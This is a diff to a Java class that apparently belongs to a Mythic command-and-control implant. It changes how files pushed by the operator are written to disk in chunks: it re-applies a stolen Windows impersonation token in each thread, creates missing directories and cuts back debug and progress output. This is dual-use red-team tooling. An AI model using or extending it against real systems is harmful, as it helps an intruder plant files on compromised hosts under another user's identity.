@@ -21,20 +21,36 @@ public class UploadBackgroundTask implements Runnable {
     private final Config config;
     private final String fullPath;
     private final String fileId;
+    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
     
-    public UploadBackgroundTask(BackgroundTask task, Config config, String fullPath, String fileId) {
+    public UploadBackgroundTask(BackgroundTask task, Config config, String fullPath, String fileId, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
         this.task = task;
         this.config = config;
         this.fullPath = fullPath;
         this.fileId = fileId;
+        this.impersonationToken = impersonationToken;
     }
     
     @Override
     public void run() {
         try {
+            // Re-apply impersonation token if present (each thread needs its own token applied)
+            if (impersonationToken != null) {
+                Config.debugLog(config, "Re-applying impersonation token in upload background thread");
+                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
+            }
+            
             Config.debugLog(config, "Upload background task started for: " + fullPath);
+            Config.debugLog(config, "[DEBUG] Upload thread alive, task.running=" + task.running + ", taskId=" + task.taskId);
             
             Path filePath = Paths.get(fullPath);
+            
+            // Create parent directories if they don't exist
+            Path parentDir = filePath.getParent();
+            if (parentDir != null && !java.nio.file.Files.exists(parentDir)) {
+                Config.debugLog(config, "Creating parent directories: " + parentDir);
+                java.nio.file.Files.createDirectories(parentDir);
+            }
             
             // Create FileOutputStream to write chunks
             try (FileOutputStream fos = new FileOutputStream(filePath.toFile())) {
@@ -42,9 +58,12 @@ public class UploadBackgroundTask implements Runnable {
                 int chunkNum = 1;
                 int totalChunks = -1; // Will be set from first message
                 
+                Config.debugLog(config, "[DEBUG] Upload task entering receive loop, waiting for chunks...");
                 while (task.running) {
                     // Wait for chunk data from Mythic
+                    Config.debugLog(config, "[DEBUG] Upload task about to call receiveFromTask() for chunk " + chunkNum);
                     JsonNode message = task.receiveFromTask();
+                    Config.debugLog(config, "[DEBUG] Upload task received message: " + (message != null ? message.toString() : "null"));
                     
                     if (message == null) {
                         Config.debugLog(config, "Upload background task received null message, exiting");
@@ -63,7 +82,8 @@ public class UploadBackgroundTask implements Runnable {
                     
                     // Write chunk to file
                     fos.write(chunkData);
-                    Config.debugLog(config, "Wrote chunk " + chunkNum + " (" + chunkData.length + " bytes)");
+                    fos.flush(); // Ensure data is written to disk
+                    Config.debugLog(config, "Wrote chunk " + chunkNum + " (" + chunkData.length + " bytes) to " + fullPath);
                     
                     // Get total chunks from first message
                     if (totalChunks == -1 && message.has("total_chunks")) {
@@ -89,12 +109,21 @@ public class UploadBackgroundTask implements Runnable {
                     Map<String, Object> ackResponse = new HashMap<>();
                     ackResponse.put("task_id", task.taskId);
                     ackResponse.put("upload", uploadAck);
-                    ackResponse.put("user_output", "Uploading chunk " + chunkNum + (totalChunks > 0 ? "/" + totalChunks : "") + "\n");
+                    // Only show progress every 10 chunks to avoid spam
+                    if (chunkNum % 10 == 0 || chunkNum == totalChunks) {
+                        ackResponse.put("user_output", "Uploading chunk " + chunkNum + (totalChunks > 0 ? "/" + totalChunks : "") + "\n");
+                    }
                     
                     task.sendResponse(ackResponse);
                 }
-                
-                fos.flush();
+            } // FileOutputStream auto-closes here, ensuring flush completes
+            
+            // Verify file exists and has content after stream is fully closed
+            if (java.nio.file.Files.exists(filePath)) {
+                long fileSize = java.nio.file.Files.size(filePath);
+                Config.debugLog(config, "Upload complete - file exists with size: " + fileSize + " bytes");
+            } else {
+                throw new Exception("Upload failed - file does not exist after write");
             }
             
             // Send completion message
@@ -106,10 +135,14 @@ public class UploadBackgroundTask implements Runnable {
             
             task.sendResponse(completionResponse);
             Config.debugLog(config, "Upload background task completed successfully");
+            Config.debugLog(config, "[DEBUG] Upload thread exiting normally");
             
         } catch (Exception e) {
             Config.debugLog(config, "Upload background task error: " + e.getMessage());
-            e.printStackTrace();
+            Config.debugLog(config, "[DEBUG] Upload thread exiting due to exception");
+            if (config.isDebug()) {
+                e.printStackTrace();
+            }
             
             // Send error response
             Map<String, Object> errorResponse = new HashMap<>();
